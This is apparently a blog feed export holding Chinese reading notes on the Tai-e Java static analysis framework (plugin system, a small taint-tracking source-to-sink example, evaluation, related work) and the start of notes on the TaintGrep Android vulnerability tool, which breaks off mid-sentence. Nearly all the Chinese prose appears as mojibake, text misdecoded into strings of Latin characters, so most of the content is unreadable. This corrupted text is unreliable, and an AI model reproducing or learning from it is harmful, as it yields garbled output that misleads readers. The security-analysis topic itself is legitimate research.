<p>æ¥ä¸‹æ¥è§£é‡Š analysis plugin system æ€ä¹ˆå·¥ä½œã€‚å¦‚å›¾3ï¼Œè¿™ä¸ªç³»ç»ŸåŒ…å«äº†ä¸€ä¸ªæŒ‡é’ˆåˆ†æ solver å’Œä¸€äº›ç”¨æˆ·å®šä¹‰çš„åˆ†æä¸å‰è€…äº¤äº’ã€‚Solver å’Œ Plugin çš„æ ¸å¿ƒè¢«åˆ†åˆ«é«˜äº®ä¸ºè“è‰²å’Œçº¢è‰²ï¼Œå¼€å‘è€…åªéœ€è¦å®ç°å’Œ Plugin ç›¸å…³çš„ APIs å°±å¯ä»¥å¼€å‘æ–°çš„ analysisã€‚é¢å¤–çš„è¾…åŠ© API æ¯”å¦‚ addStmtï¼ˆæ¨¡æ‹Ÿè°ƒç”¨çš„æ•ˆæœï¼Œå’Œå‰é—®æåŠçš„ Wala ç›¸ä¼¼ï¼‰ä½¿å¾—åˆ›å»ºå…·ä½“çš„åŠŸèƒ½æ›´åŠ ç®€å•ã€‚</p>
<p>è®©æˆ‘ä»¬é˜è¿°å®ƒçš„åŸºæœ¬å·¥ä½œæœºåˆ¶ï¼Œé©±ä½¿é‚£äº›æ ¸å¿ƒçš„ APIsã€‚å‡å®šä½ åœ¨å®ç°æŸä¸ª analysis Plugin çš„onNewPointsToSet æ–¹æ³•ï¼Œå½“å˜é‡ Var çš„  points-to setï¼ˆPTSï¼‰æ”¹å˜äº†ï¼Œä½ éœ€è¦å†™å¤„ç†ç›¸å…³çš„å‰¯ä½œç”¨çš„é€»è¾‘ã€‚ç»“æœå°±æ˜¯ï¼Œä½ éœ€è¦æ›´æ–°å’ŒæŒ‡é’ˆç›¸å…³çš„ PTSï¼Œæˆ–è€…æ·»åŠ ä¸€ä¸ª call graph edges ç›¸å…³çš„ call sitesã€‚å› æ­¤ï¼Œåœ¨å®ç° onNewPointsToSet æ—¶ï¼Œä½ éœ€è¦è°ƒç”¨ addPointsTo æˆ–è€… addCallEdge æ–¹æ³•æ¥æç¤ºè¿™äº›å˜åŒ–ã€‚</p>
<p>ç›¸åçš„è¯´ï¼Œåœ¨åˆ†æçš„è¿­ä»£ä¸­ï¼ŒSolver ä¼šè‡ªåŠ¨çš„è°ƒç”¨ onNewPointsToSet å’Œ onNewCallEdge æ–¹æ³•æ¥æç¤ºå˜é‡ï¼ˆVarï¼ŒPTSï¼‰å¯èƒ½å‘ç”Ÿçš„æ”¹å˜ã€‚æœ€ç»ˆï¼Œå¼€å‘è€…åªéœ€è¦ Plugin çš„å‡ ä¸ªæ¨¡å—å°±å¯ä»¥å®ç°ç›®çš„äº†ã€‚</p>
<h2 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h2><p><img src="https://i.imgs.ovh/2023/10/10/Ly3BT.png" alt="image-20231009205124208"></p>
<p>ä¸ºäº†æ›´å¥½çš„ç†è§£æ€æ ·æ„å»ºæ–°çš„ analyses ï¼Œä½œè€…ç»™äº†ä¸€ä¸ªä¾‹å­ï¼Œå¦‚å›¾4ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ±¡ç‚¹è¿½è¸ªçš„ä¾‹å­ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1</span> <span class="token class-name">String</span> s1 <span class="token operator">=</span> x<span class="token punctuation">.</span><span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token number">2</span> s3 <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token number">3</span> y<span class="token punctuation">.</span><span class="token function">sink</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>x.source() è¿”å›äº†ä¸€ä¸ªå¯¹è±¡ o1ï¼Œo1 åˆè¢«æ··åˆæˆä¸º o3ï¼Œo3 è¢« s3æŒ‡å‘ï¼Œs3 ç”± s2.concat(s1) è¿”å›ï¼Œæ±¡ç‚¹è¿½è¸ªæŠ¥å‘Šäº†ç¬¬ä¸‰è¡ŒåŒ…å«æ³„éœ² o1ï¼ˆæ•æ„Ÿæ•°æ®ï¼‰ï¼Œå½“ o3 è¢«ä¸€ä¸ª sink æ–¹æ³•è°ƒç”¨æ—¶ã€‚</p>
<p>å› ä¸ºæ±¡ç‚¹è¿½è¸ªè¢«å¼€å‘ä¸ºä¸€ä¸ª analysis æ’ä»¶ï¼Œä»–éœ€è¦å®ç°ä¸€äº› Plugin çš„æ–¹æ³•ï¼Œåœ¨å›¾4ä¸­ï¼Œå®ç°äº† onNewCallEdgeï¼ˆ3è¡Œï¼‰ï¼ŒonNewPointsToSetï¼ˆ12è¡Œï¼‰å’Œè¾…åŠ©å‡½æ•° onFinishï¼ˆ21è¡Œï¼‰ã€‚</p>
<p>å¯¹äº onNewCallEdgeï¼Œå‡å®šæˆ‘ä»¬åœ¨å¤„ç†ç¬¬ä¸€è¡Œ call siteï¼ˆString s1&#x3D;x.source()ï¼‰ï¼Œå¯¹äºè¿™ä¸ªè°ƒç”¨ç‚¹ï¼ŒæŒ‡é’ˆåˆ†æå·²ç»åˆ›å»ºäº†ä» edge sourceï¼ˆè¢«è¡¨ç¤ºä¸º edge.cs çš„ call siteï¼‰åˆ°edge target çš„æ–°çš„ call graphï¼Œç„¶åæ±‚è§£å™¨é€šçŸ¥æ±¡ç‚¹è¿½è¸ªæ’ä»¶å¹¶ä¸”ä¼ å…¥ä½œä¸ºå‚æ•°çš„æ–°è¾¹ï¼ˆ3è¡Œï¼‰ï¼Œé€šè¿‡è°ƒç”¨æ’ä»¶çš„ onNewCallEdge å‡½æ•°ã€‚</p>
<p>ç„¶åæ’ä»¶æ£€æŸ¥ edge.targetã€‚å¦‚æœ target æ˜¯ä¸€ä¸ªæ•æ„Ÿçš„æ–¹æ³•ï¼Œæ˜¯ sourceï¼ˆå›¾4ç¬¬4è¡Œï¼‰ã€‚ä¸€ä¸ªæ±¡ç‚¹å¯¹è±¡å°±è¢«åˆ›å»ºäº†ï¼ˆ5è¡Œï¼‰ï¼Œç„¶åæ’ä»¶ç»™ solver æ›´æ–°äº†é‚£ä¸ª call site çš„ left-hand å˜é‡ï¼ˆedge.cs.lhsVï¼‰ï¼Œå«åš s1ï¼ˆ6è¡Œï¼‰ï¼Œs1åº”è¯¥æŒ‡å‘åˆšåˆ›å»ºçš„æ±¡ç‚¹å¯¹è±¡ã€‚</p>
<p>å¦‚æœ target æ˜¯ä¸€ä¸ª transfer æ–¹æ³•ï¼ˆ7è¡Œï¼‰ï¼Œä»–å°±ä¼šæŠŠæ±¡ç‚¹ä¼ åˆ°å…¶ä»–çš„å¯¹è±¡ä¸­ã€‚<del>ï¼ˆå¿½ç•¥ä¸€ç‚¹ç‚¹è®ºæ–‡ç»†èŠ‚ï¼‰</del></p>
<h1 id="MULTIPLE-ANALYSES-MANAGEMENT"><a href="#MULTIPLE-ANALYSES-MANAGEMENT" class="headerlink" title="MULTIPLE ANALYSES MANAGEMENT"></a>MULTIPLE ANALYSES MANAGEMENT</h1><p>å¾ˆå¤šæƒ…å†µä¸‹ï¼Œä¸€ä¸ªåˆ†æä¾èµ–äºå¦ä¸€ä¸ªåˆ†æçš„è¾“å‡ºï¼Œå¦‚æœæä¾›è¿™ç§æœºåˆ¶ï¼Œå¯¹æ¡†æ¶éå¸¸æœ‰å¸®åŠ©ã€‚æ¥ä¸‹æ¥æ˜¯å…³äºå¢æ°§é…ç½® analysis ä¾èµ–å’Œæ€æ ·ä¿å­˜ä¸€ä¸ª analysis çš„è¾“å‡ºå¹¶ä¸”ä»å¦å¤–çš„åœ°æ–¹è®¿é—®ã€‚</p>
<h2 id="Configure-Analysis-and-its-Dependencies"><a href="#Configure-Analysis-and-its-Dependencies" class="headerlink" title="Configure Analysis and its Dependencies"></a>Configure Analysis and its Dependencies</h2><p>Wala æ²¡æœ‰æ˜¾å¼çš„ç®¡ç†æ¥è¿›è¡Œå¤šé‡åˆ†æã€‚åœ¨ Soot ä¸­ï¼Œä¸ºäº†æ·»åŠ æ–°çš„åˆ†æï¼Œå¼€å‘è€…éœ€è¦ç¡¬ç¼–ç ä»£ç è¿› Soot ä¸­ï¼Œè€Œ Tai-e æ”¯æŒé€šè¿‡é…ç½®æ–‡ä»¶æ³¨å†Œæ¡†æ¶ä¸­æ‰€ä»¥çš„æ–°åˆ†æï¼ˆåŠå…¶ä¾èµ–å…³ç³»ï¼‰ï¼Œç„¶åé€šè¿‡åå°„è‡ªåŠ¨é©±åŠ¨å®ƒä»¬ï¼Œè¿™æ ·è§£è€¦äº†ä»£ç ã€‚æ­¤å¤– Soot åœ¨è¿è¡Œåˆ†æä¹‹å‰ï¼Œç”¨æˆ·éœ€è¦æ˜ç¡®åˆ—å‡ºä»»ä½•ä¾èµ–åˆ†æï¼Œè¿™æ ·æ¯”è¾ƒéº»çƒ¦è€Œä¸”ä¸ç†Ÿæ‚‰æ¡†æ¶çš„äººå®¹æ˜“å‡ºé”™ã€‚è€Œåœ¨ Tai-e ä¸­ä¾èµ–å…³ç³»æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œç¡®ä¿æ‰€æœ‰ä¾èµ–åˆ†ææ­£å¸¸æ‰§è¡Œã€‚ä¸ SpotBugs ç›¸æ¯”ï¼ŒTai-e åœ¨è§£æåˆ†æä¾èµ–å…³ç³»æ–¹é¢æ›´åŠ çµæ´»ï¼Œé€šè¿‡æ”¯æŒæ¡ä»¶é€»è¾‘æ¥æè¿°åˆ†æé€‰é¡¹å’Œä¾èµ–å…³ç³»ã€‚</p>
<h2 id="Store-x2F-Access-Analysis-Results"><a href="#Store-x2F-Access-Analysis-Results" class="headerlink" title="Store&#x2F;Access Analysis Results."></a>Store&#x2F;Access Analysis Results.</h2><p>è¿™è™½ç„¶çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªå¾®ä¸è¶³é“çš„ç»†èŠ‚ï¼Œä½†æ˜¯ä¹Ÿèƒ½å½±å“ä½¿ç”¨è€…çš„ä½“éªŒã€‚Soot åªèƒ½å­˜å‚¨ä¸€äº›æŒ‡é’ˆåˆ†æç»“æœåœ¨ singleton instance of Sceneï¼ŒSpotBugs ä¸­ç”¨æˆ·éœ€è¦è®°ä½ä¸åŒæ–¹æ³•å’Œå‚æ•°ä»¥è·å¾—å¤šæ ·çš„ analysis çš„ç›¸å…³çš„ç»“æœã€‚åœ¨ Tai-e ä¸­ï¼Œç”¨æˆ·åªè¦è®°å¾—ä¸€ä¸ªæ–¹æ³• getResult(id) å°±å¯ä»¥äº†ã€‚ï¼ˆid æ˜¯åˆ†æçš„åå­—å’Œé…ç½®ï¼‰ï¼Œè€Œä¸”è¿™æ˜¯å¯¹äºæ‰€æœ‰ç±»å‹çš„åˆ†æï¼ŒåŒ…æ‹¬äº† method-ï¼Œclass- å’Œ program-level analysesã€‚ç”¨æˆ·ä¸å†éœ€è¦æ‹…å¿ƒè®°å¿†å¤æ‚çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä½¿ç”¨é¢å¤–çš„å‚æ•°æ¥è·å¾—ç»“æœã€‚</p>
<h1 id="EVALUATION"><a href="#EVALUATION" class="headerlink" title="EVALUATION"></a>EVALUATION</h1><p>Tai-a çš„ä¼˜ç‚¹åœ¨å‰æ–‡åŸºæœ¬éƒ½è®²è¿‡ï¼Œç¼ºç‚¹ä¹Ÿæœ‰ä¸€äº›ã€‚</p>
<ul>
<li>æ–‡æ¡£æ¯”è¾ƒå°‘</li>
<li>ç”Ÿæ€ä¸å¤Ÿå®Œå–„</li>
<li>å¯èƒ½æŸç§ç¨‹åº¦ä¸Šä¸å¤Ÿçµæ´»ï¼Œæ¯”å¦‚ plugin system ä¸èƒ½é‡å†™ visitXXX() å‡½æ•°ã€‚</li>
</ul>
<p>äººä»¬ä»ç„¶éå¸¸å…³æ³¨æ•ˆç‡ï¼Œå°½ç®¡ Tai-e çš„ç›®æ ‡æ˜¯ user-friendly ã€‚ä½œè€…ä½¿ç”¨äº†æ‰€æœ‰çš„æ ‡å‡† Java DaCapo benchmarks åŠ ä¸Šä¸€äº›åœ¨æœ€è¿‘çš„æ–‡ç« ä¸­ç»å¸¸ä½¿ç”¨çš„ real-world åº”ç”¨ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LyWfd.png" alt="image-20231010002222335"></p>
<p>åœ¨æŒ‡é’ˆåˆ†æä¸­ï¼Œå¦‚è¡¨1ï¼ŒTai-e æ¯”èµ·å…¶ä»–æœ‰ç€æ›´å¥½çš„ Recallï¼Œæ•ˆç‡ä¸Šä¹Ÿæ›´é«˜ï¼Œå¾—ç›Šäºåå°„çš„ç²¾åº¦ï¼Œnative code modelingï¼Œä»¥åŠå¾ˆå¤šæŒ‡é’ˆåˆ†æå®ç°ä¸Šçš„ä¼˜åŒ–ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LykRK.png" alt="image-20231010002924438"></p>
<p>åœ¨æ•°æ®æµåˆ†æä¸­ï¼Œä½œè€…åˆå±•ç¤ºäº†è¡¨2ä¸­çš„å¹³å‡æ•°æ®ã€‚Tai-e åœ¨è¿™ä¸ªåˆ†æä¸­ä¸å¦‚ Soot ä½†æ˜¯æ¯” Wala å’Œ SpotBugs å¥½ï¼Œä»–ä»¬åˆ†æ Soot åœ¨æ•°æ®æµåˆ†æä¸­æœ‰æ¯”è¾ƒå¤æ‚çš„ä¼˜åŒ–ï¼Œè€Œè¿™ç§ä¼˜åŒ–åœ¨ Tai-e ä¸­æ²¡æœ‰ã€‚<del>ï¼ˆæ€ä¹ˆæœ‰ä¸€ç§æœªæ¥å¯æœŸçš„æ„Ÿè§‰ï¼‰</del></p>
<h1 id="RELATED-WORK"><a href="#RELATED-WORK" class="headerlink" title="RELATED WORK"></a>RELATED WORK</h1><p>å¼ºç›¸å…³çš„åœ¨å‰æ–‡å·²ç»æåŠï¼Œåœ¨è¿™é‡Œè®¨è®ºä¸€äº›é¢å¤–çš„ç›¸å…³çš„å·¥ä½œã€‚</p>
<p>Lam et al. å›é¡¾äº† Sootï¼Œæ€»ç»“äº†å®ƒçš„ä¸»è¦çš„ç‰¹å¾å’ŒæŒ‘æˆ˜ï¼ˆè”åˆå•ä¸ªä»¥æ”¯æŒå¤šé‡çš„åˆ†æï¼Œåˆ†æä¸å®Œæ•´çš„ç¨‹åºç­‰ï¼‰ï¼Œæœªæ¥çš„æ–¹å‘ï¼ˆæ„å»ºæ›´å¿«çš„ startupï¼Œæé«˜è¿‡ç¨‹é—´åˆ†æèƒ½åŠ›ï¼‰ï¼Œå¦å¤–ä»–ä»¬è¿˜æåŠä¸€äº›å¼€å‘ Soot ä¸­çš„å›°éš¾ï¼Œå»ºè®®äº†ä¸€äº›æœªæ¥ç¼–è¯‘å™¨çš„æ¡†æ¶ã€‚</p>
<p>Schubert et al. æè¿°äº†æ„å»º C&#x2F;C++ åˆ†ææ¡†æ¶çš„ç»éªŒï¼Œæœ‰ä¸€éƒ¨åˆ†ç”¨äºç‰¹å®šçš„æ¡†æ¶ï¼Œè€Œå¦ä¸€éƒ¨åˆ†æ¯”è¾ƒé€šç”¨ã€‚æ¯”å¦‚å®ƒæä¾›äº† meas like instruction å¸®åŠ©è°ƒè¯• analysis-related bugsï¼ŒTai-e è€ƒè™‘æ•´åˆè¿›è¿™ä¸ªã€‚</p>
<p>Sadowski et al. æ€»ç»“äº†åœ¨ Google æ„å»ºé™æ€åˆ†æå·¥å…·çš„ç»éªŒã€‚å®ƒå»ºè®®å°½æ—©<strong>åˆå¹¶é™æ€åˆ†æè¿›å·¥ä½œæµ</strong>ï¼Œå°½å¯èƒ½æŠŠ analysis check å½“ä½œç¼–è¯‘å™¨æŠ¥é”™æ¥åšï¼ˆå¦åˆ™å¼€å‘è€…ç»å¸¸é—å¿˜åˆ†æçš„ç»“æœï¼‰ã€‚</p>
<p>æ¥è‡ª Facebook çš„ç ”ç©¶è¡¨æ˜è¿‡ç¨‹é—´åˆ†æå¯¹å‘ç°æ·±å±‚çš„ bugs å’Œå®‰å…¨æ¼æ´çš„ä»·å€¼ã€‚Tai-e çš„ analysis plugin system è¢«ä¸“é—¨è®¾è®¡äº†ï¼Œä¸ºäº†è®©å¼€å‘å¾ˆå¤šå¤æ‚çš„ä¸æŒ‡é’ˆåˆ†æäº¤äº’çš„è¿‡ç¨‹é—´åˆ†æï¼Œæ¯”å¦‚ç²¾å‡†çš„ virtual-call å¤„ç†å’Œ static value-flow trackingã€‚</p>
<p>ä¸€äº›ç ”ç©¶ç”¨ç”¨æˆ·è§†è§’çš„æ–¹å¼è¯„ä¼°é™æ€åˆ†æå·¥å…·ï¼Œæ¯”å¦‚ï¼Œä¸€ä¸ªå¥½çš„é™æ€åˆ†æå·¥å…·åº”è¯¥æœ‰é«˜è´¨é‡çš„è­¦å‘Šä¿¡æ¯å°½ç®¡è¿™æä¾›çš„ä¿¡æ¯å¯èƒ½æœ‰é”™è¯¯ã€ä¸ºä»€ä¹ˆè¿™é‡Œåº”è¯¥è¢«ä¿®å¤ã€è¿™åº”è¯¥ä¸“é—¨ä¿®å¤ç­‰ã€‚</p>
<p>Chord æ˜¯ä¸€ä¸ªç”± Java å’Œ Datalog bddbddb å†™çš„ Java é™æ€åˆ†ææ¡†æ¶ï¼Œä½œä¸º Datalog çš„solverã€‚Datalog çš„ä¼˜åŠ£åœ¨å‰æ–‡å·²ç»è®²è¿°è¿‡äº†ã€‚Chord å› æ£€æµ‹åŒæ­¥é—®é¢˜æ¯”å¦‚æ•°æ®ç«äº‰çš„èƒ½åŠ›è€ŒçŸ¥åã€‚Tai-e å°†ä¼šå‘½ä»¤å¼çš„ï¼ˆimperativelyï¼‰å¼€å‘è¿™äº›å®¢æˆ·ç«¯ã€‚</p>
<p>OPAL æ˜¯ä¸€ä¸ªç”± Scala å†™çš„ Java é™æ€åˆ†ææ¡†æ¶ã€‚ä¸å¹¸çš„æ˜¯å¯¹äºä½œè€…æ¥è¯´å¾ˆéš¾å’Œ OPAL å®ç°çš„é™æ€åˆ†æåä½œã€‚å¦å¤– OPAL çš„ä½œè€…ä¸»å¯¼äº†ä¸€ä¸ªæœ‰è¶£çš„è°ƒæŸ¥ä¸åŒæ¡†æ¶çš„ call graphs çš„ soundness ï¼Œå¼ºè°ƒäº†æœ‰æ•ˆå®ç°è¯­è¨€ç‰¹å¾çš„æœ‰æ•ˆæ€§ã€‚</p>
<p>Tai-e çš„æŸäº›è®¾è®¡å— TAJS çš„å¯å‘ï¼ŒTAJS æ˜¯ä¸€ä¸ªç»å…¸çš„ JavaScript å’Œ Node.js é™æ€åˆ†ææ¡†æ¶ï¼Œ å…¶ä¸­ä¹‹ä¸€æ˜¯å›å½’æµ‹è¯•ï¼Œå¦ä¸€ä¸ªæ˜¯ analysis plugin system çš„åˆå§‹çš„æ€æƒ³ã€‚solver plugins ç»“æ„å’Œ TAJS çš„monitor approach æ¯”è¾ƒç›¸ä¼¼ï¼Œå°½ç®¡ä»–ä»¬çš„ç›®æ ‡ä¸å¤ªä¸€æ ·ã€‚</p>
<h1 id="CONCLUSIONS"><a href="#CONCLUSIONS" class="headerlink" title="CONCLUSIONS"></a>CONCLUSIONS</h1><p>å°½ç®¡é™æ€åˆ†æå‘å±•äº†å¾ˆå¤šå¹¶ä¸”åœ¨è¿‡å»å‡ åå¹´å‡ºç°äº†ä¸€äº›çŸ¥åçš„å·¥å…·ã€‚å¯¹äºé‚£äº›ä¾èµ–æ¡†æ¶éœ€è¦æ„å»º analyses çš„å¼€å‘è€…ï¼Œè¿™äº›æ¡†æ¶å¹¶ä¸é‚£ä¹ˆç®€å•å»å­¦ä¹ å’Œä½¿ç”¨ï¼Œå› ä¸ºæ„å»ºä¸€ä¸ªå¼€å‘è€…æœ‰å¥½çš„é™æ€åˆ†ææ¡†æ¶å¹¶éæ˜“äº‹ã€‚è¿™ç¯‡æ–‡ç« åœ¨è¿™æ–¹é¢å‰è¿›äº†ä¸€æ­¥ï¼Œé€šè¿‡ç³»ç»Ÿçš„æ¯”è¾ƒå’Œè®¨è®ºå…³é”®ç»„ä»¶è®¾è®¡çš„æƒè¡¡ Java é™æ€åˆ†ææ¡†æ¶ï¼Œéµå¾ªäº† HGDC åŸåˆ™ã€‚</p>
<p>å¯¹äºæ¯ä¸€ä¸ªè®¾è®¡ç‚¹ï¼Œä½œè€…çš„åŠªåŠ›æ˜¯æ¯”è¾ƒå¤š labor- å’Œ intelligence-intensiveã€‚ä»–ä»¬å¿…é¡»æ¯”è¾ƒå……æ»¡å¤æ‚ analysis algorithms çš„å®ç°çš„å¤§å‹ä¸”å¤æ‚çš„æ¡†æ¶çš„ä»£ç ã€‚ä½†æ˜¯è¿™äº›æ˜¯éå¸¸å€¼å¾—çš„ï¼Œå› ä¸ºè¿™äº›å¸®åŠ©äº† Tai-e çš„è¯ç”Ÿã€‚ä¸” Tai-e è¾¾æˆäº†è‡ªå·±çš„ç›®çš„ friendlyã€‚ä½œè€…å¸Œæœ›è¿™ä¸ªå·¥ä½œèƒ½å¤Ÿç»™é™æ€åˆ†æåŸºç¡€æä¾›æ¯”è¾ƒæœ‰ç”¨çš„èµ„æ–™å’Œè§‚ç‚¹ï¼Œä»–ä»¬ä¹Ÿä¼šç§¯ææŒç»­çš„å¼€å‘ Tai-eï¼Œåœ¨æœªæ¥åˆå¹¶è¿›æ›´å¤šçš„ analyses å’Œ clientsã€‚</p>
]]></content>
      <categories>
        <category>Notes</category>
        <category>Paper</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>è®ºæ–‡é˜…è¯»ç¬”è®°</title>
    <url>/2023/10/05/%E6%95%A3%E8%A8%98-10-5-23/</url>
    <content><![CDATA[<h1 id="è«–æ–‡é–²è®€"><a href="#è«–æ–‡é–²è®€" class="headerlink" title="è«–æ–‡é–²è®€"></a>è«–æ–‡é–²è®€</h1><blockquote>
<p>Ruiguo Yang, Jiajin Cai, and Xinhui Han. 2022. Poster: TaintGrep: A Static Analysis Tool for Detecting Vulnerabilities of Android Apps Supporting User-defined Rules. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (CCS â€˜22). Association for Computing Machinery, New York, NY, USA, 3507â€“3509. <a href="https://doi.org/10.1145/3548606.3563527">https://doi.org/10.1145/3548606.3563527</a></p>
</blockquote>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>ä½œè€…æè¿°èªªå¤§éƒ¨åˆ†çš„å®‰å“æ¼æ´éƒ½å±¬æ–¼é‚è¼¯æ¼æ´<del>ï¼ˆæŒ‡çš„æ‡‰è©²æ˜¯æ‡‰ç”¨å±¤çš„æ¼æ´ï¼‰</del>ï¼Œå¯ä»¥å¤§éƒ¨åˆ†åˆ†çˆ²å…©éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ•¸æ“šï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯å°æ•¸æ“šçš„è™•ç†ã€‚ç¬¬ä¸€éƒ¨åˆ†çš„ä¸å¯é çš„æ•¸æ“šæˆ‘å€‘å¯ä»¥é€šéæ•¸æ“šæµåˆ†æå¾—åˆ°ï¼Œè€Œå°ä¸å¯é çš„æ•¸æ“šé€²è¡Œæ“ä½œå‰‡éœ€è¦èªç¾©åˆ†æã€‚</p>
<p>ç•¶å‰çš„å®‰å…¨ç ”ç©¶è€…éœ€è¦æ‰‹å‹•çš„å»å¯©è¨ˆå¯èƒ½çš„æ¼æ´é»ï¼Œç„¶è€Œç”±æ–¼ç¬¬ä¸‰æ–¹åº«å’Œå¤§é‡çš„å®‰å“ç¨‹åºçš„åŸºç¤è¨­æ–½å’Œé‚è¼¯è¨­è¨ˆ<del>ï¼ˆå…·é«”æœ‰å“ªäº›å‘¢ï¼‰</del>ï¼Œé€™éå¸¸æ¶ˆè€—æ™‚é–“ï¼Œä¹Ÿå°±éœ€è¦é«˜æ•ˆçš„è‡ªå‹•åŒ–çš„æ–¹å¼å»åˆ†æã€‚</p>
<p>æœ‰å…©ç¨®ï¼Œå‹•æ…‹åˆ†ææ¯”å¦‚ Droidfuzzerï¼Œéœæ…‹åˆ†æå¦‚ Amandroidï¼ŒDroidSafeï¼ŒOAuthLintï¼Œä½†æ˜¯ç”±æ–¼é€™äº›åˆ†æå¤§éƒ¨åˆ†éƒ½ç¼ºå°‘èªç¾©ä¿¡æ¯ï¼Œé¢å°å¦‚ try catch è™•ç†ä¸äº†ï¼Œå°±æœƒç”¢ç”Ÿéå¸¸å¤šçš„é—œæ–¼ Dos çš„ false positive å ±éŒ¯ã€‚</p>
<p>è€Œæœ‰ä¸€äº›å¯ä»¥é€²è¡Œèªç¾©æ¨¡å¼åŒ¹é…çš„å·¥å…·æ¯”å¦‚èª¬ CodeQL å’Œ Semgrepï¼ŒCodeQL çš„ç¼ºé»æ˜¯ä»–ä¾è³´æ–¼å®Œæ•´çš„ä»£ç¢¼å’Œç·¨è­¯ç’°å¢ƒï¼Œç„¶è€Œé€™å°æ–¼å®‰å…¨ç ”ç©¶è€…è€Œè¨€å¯é‡ä¸å¯æ±‚ã€‚Semgrep çš„ç¼ºé»æ˜¯å®ƒä¸èƒ½è­˜åˆ¥å®‰å“çš„æ‡‰ç”¨çš„çµ„ä»¶<del>ï¼ˆæ²’ç”¨éï¼Œä¸æ¸…æ¥šé€™è£èª¬çš„æ˜¯ä»€éº½æ„æ€ï¼‰</del>ï¼Œä¹Ÿå°±ä¸å¯èƒ½ç²å¾—é‚£äº›å¯ä»¥æœ‰ vulnerable input çš„çµ„ä»¶ã€‚</p>
<p>ç¶œä¸Šä½œè€…å°±æå‡ºäº†é€™ç¨®ï¼Œæ—¢çµåˆéœæ…‹åˆ†æä¸­çš„æ±¡é»è¿½è¹¤ï¼Œåˆçµåˆèªç¾©åŒ¹é…åˆ†æï¼Œé‚„å¯ä»¥åˆ†æçµ„ä»¶çš„<del><strong>ï¼ˆæœªé–‹æºçš„ï¼Œé€ƒï¼‰</strong></del>éœæ…‹åˆ†æå·¥å…·ã€‚</p>
<p><img src="https://i.imgs.ovh/2023/10/10/LysYV.png" alt="image-20231005160301135"></p>
<h2 id="METHODLOGY"><a href="#METHODLOGY" class="headerlink" title="METHODLOGY"></a>METHODLOGY</h2><p>ç¨‹åºæ¥æ”¶ä¸‰å€‹è¼¸å…¥ï¼Œç¨‹åºçš„ java ä»£ç¢¼ã€manifest files <del>ï¼ˆæ‡‰è©²æ˜¯å‰æ–‡èª¬çš„ components åˆ†æï¼‰</del> ã€ç”¨æˆ¶è‡ªå®šç¾©çš„è¦å‰‡ï¼Œä½œçˆ²è¼¸å…¥ï¼Œå ±å‘Šå¯ä»¥çš„ä»£ç¢¼ç‰‡æ®µã€‚ç”±æ–¼ç¨‹åºä¸¦ä¸éœ€è¦å°æºä»£ç¢¼é€²è¡Œè™•ç†ï¼Œæ‰€ä»¥å°æ–¼åŠ æ®¼çš„ç¨‹åºä¹Ÿåªè¦è„«æ®¼äº†å°±èƒ½ç”¨ã€‚é€™å€‹ç³»çµ±åŒ…å«äº†å…©å€‹æ¨¡å¡Šï¼Œanalysis module èˆ‡ filter moduleï¼Œå¦‚åœ–æ‰€ç¤ºï¼Œå¯«ä½œçµ¦å‡ºæœ€å¾Œçš„å ±å‘Šã€‚</p>
<h3 id="System-Design"><a href="#System-Design" class="headerlink" title="System Design"></a>System Design</h3><p>analysis module æ˜¯çˆ²äº†ç²å¾—åŸºæœ¬çš„ç¨‹å¼ä¿¡æ¯ï¼Œå°æ–¼ manifest æ–‡ä»¶ï¼Œæå–äº† enabledï¼Œexportedï¼Œnameï¼Œpermission å’Œ intent-filterã€‚å°æ–¼æ‡‰ç”¨ç¨‹å¼ï¼Œä½œè€…ä½¿ç”¨äº† jeb ç”Ÿæˆ call graphï¼Œä¸¦ä»¥ DFS çš„æ–¹å¼ç”Ÿç”¢äº†æ»¿è¶³å¾Œç«¯è¦å‰‡çš„èª¿ç”¨éˆã€‚ç„¶å¾ŒæŠŠé€™å€‹èª¿ç”¨éˆå‚³çµ¦ filter moduleã€‚</p>
<p>filter module çš„è¦å‰‡æ˜¯ç”±ä¸€é–‹å§‹çš„è¦å‰‡ç”Ÿæˆçš„ï¼Œå¾ cross-function rules è®Šæˆ intra-function rules <del>ï¼ˆé€™è£æœ‰é»ä¸æ¸…æ¥šï¼Œä»€éº½æ˜¯ intra-function rulesï¼‰</del>ï¼Œç„¶å¾Œå­æ¨¡å¡Šè¿­ä»£å‡½æ•¸ç„¶å¾Œæ‹¿è¦å‰‡å»åŒ¹é…ä»£ç¢¼ï¼Œå‰”é™¤ä¸åŒ¹é…çš„å‡½æ•¸éˆã€‚å¦‚æœé–‹å•“äº†æ±¡é»è¿½è¹¤ï¼Œå°±å¯ä»¥è¨ˆç®—è¼¸å…¥æœ€çµ‚èƒ½å¦å½±éŸ¿åˆ°æœ€çµ‚çš„ sink functionã€‚æœ€å¾ŒæŠŠé€™å€‹èª¿ç”¨éˆå‚³çµ¦è¼¸å‡ºï¼Œç”±å®‰å…¨ç ”ç©¶è€…æ‰‹å‹•çš„æª¢æŸ¥æ˜¯å¦æ˜¯æ¼æ´ã€‚ä½œè€…é€™å€‹æ¨¡å¡Šçš„å¯¦ç¾æ˜¯åŸºæ–¼ Semgrep 